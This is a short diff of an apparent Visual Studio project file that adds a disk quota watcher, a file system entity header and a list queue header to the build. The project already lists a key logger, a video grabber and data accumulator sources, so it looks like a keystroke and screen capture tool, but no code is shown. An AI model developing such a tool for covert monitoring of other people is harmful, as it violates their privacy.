@@ -13,6 +13,7 @@
   <ItemGroup>
     <ClCompile Include="DataAccumulator.cpp" />
     <ClCompile Include="DataProvider.cpp" />
+    <ClCompile Include="DiskQuotaWatcher.cpp" />
     <ClCompile Include="KeyLogger.cpp" />
     <ClCompile Include="main.cpp" />
     <ClCompile Include="VideoGrabber.cpp" />
@@ -20,7 +21,10 @@
   <ItemGroup>
     <ClInclude Include="DataAccumulator.h" />
     <ClInclude Include="DataProvider.h" />
+    <ClInclude Include="DiskQuotaWatcher.h" />
+    <ClInclude Include="FileSystemEntity.h" />
     <ClInclude Include="KeyLogger.h" />
+    <ClInclude Include="ListQueue.h" />
     <ClInclude Include="resource.h" />
     <ClInclude Include="VideoGrabber.h" />
   </ItemGroup>
